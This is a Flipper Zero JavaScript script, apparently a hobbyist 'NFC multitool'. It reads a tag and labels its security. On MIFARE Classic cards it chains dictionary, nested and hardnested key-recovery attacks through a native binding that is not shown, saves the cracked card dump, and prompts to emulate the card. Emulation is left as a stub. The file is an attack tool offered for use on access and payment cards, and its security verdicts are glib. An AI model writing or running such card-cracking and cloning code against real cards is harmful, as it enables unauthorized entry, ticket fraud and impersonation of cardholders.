// multitool_nfc.js
//
// Drop in /ext/apps/Scripts/ on your Flipper Zero
// Requires a C binding "nfc_attacks" (dict_attack, nested_attack, hardnested_attack)
//

let gui = require("gui");
let dialog = require("gui/dialog");
let nfc = require("nfc");
let storage = require("storage");

// Native binding (implemented in C, see plugin skeleton)
let nfc_attacks = require("nfc_attacks");

async function checkTagSecurity() {
    let tag = await nfc.readTag();

    if (!tag) {
        gui.showToast("No NFC tag detected.");
        return null;
    }

    gui.showToast(`Tag UID: ${tag.uid}`);
    gui.showToast(`Tag Type: ${tag.type}`);

    switch (tag.type) {
        case "MIFARE Classic":
            gui.showToast("Crypto-1 cipher. Vulnerable.");
            return tag;
        case "NTAG213":
            gui.showToast("Unprotected NTAG213. Easily cloned.");
            return tag;
        case "MIFARE DESFire EV1":
            gui.showToast("DESFire EV1 (AES) → Secure.");
            return tag;
        default:
            gui.showToast("Unknown tag type.");
            return tag;
    }
}

async function runClassicAttacks(tag) {
    // Step 1: Dictionary Attack
    gui.showToast("Trying dictionary attack...");
    let key = nfc_attacks.dict_attack("/ext/nfc/assets/mf_classic_dict_user.nfc");
    if (key) {
        gui.showToast("Found key: " + key);

        // Step 2: Nested Attack
        let nested = nfc_attacks.nested_attack(key);
        if (nested) {
            gui.showToast("Nested attack succeeded.");
            await saveDump(tag, "classic_dump_" + tag.uid + ".bin");
            let emulate = await dialog.prompt("Emulate cracked card?");
            if (emulate) {
                await emulateCard(tag);
            }
            return;
        }

        // Step 3: Hardnested fallback
        gui.showToast("Nested failed → starting hardnested...");
        let hard = nfc_attacks.hardnested_attack();
        if (hard) {
            gui.showToast("Hardnested succeeded!");
            await saveDump(tag, "classic_dump_" + tag.uid + ".bin");
        } else {
            gui.showToast("Hardnested failed.");
        }
    } else {
        gui.showToast("No dictionary keys found. Hardnested directly...");
        let hard = nfc_attacks.hardnested_attack();
        if (hard) {
            gui.showToast("Hardnested succeeded!");
            await saveDump(tag, "classic_dump_" + tag.uid + ".bin");
        } else {
            gui.showToast("Hardnested failed.");
        }
    }
}

// Save card dump
async function saveDump(tag, filename) {
    try {
        let path = "/ext/apps_data/" + filename;
        await storage.writeBinary(path, tag.raw); // requires tag.raw from C side
        gui.showToast("Saved: " + path);
    } catch (e) {
        gui.showToast("Error saving dump: " + e);
    }
}

// Stub for emulateCard
async function emulateCard(tag) {
    gui.showToast("Emulate not yet implemented in JS.");
    // Would call nfc.emulate(tag) if supported in API
}

// Entry point
async function main() {
    gui.showToast("NFC Multitool starting...");
    let tag = await checkTagSecurity();
    if (!tag) return;

    if (tag.type === "MIFARE Classic") {
        await runClassicAttacks(tag);
    } else if (tag.type === "NTAG213"){
          gui.showToast("This card is easily cloneable");
    }
    else if (tag.type === "MIFARE DESFire EV1"){
          gui.showToast("Unhackable, your cooked bro");
    }
    gui.showToast("Done.");
}

main().catch((err) => {
    gui.showToast("Error: " + err);
});
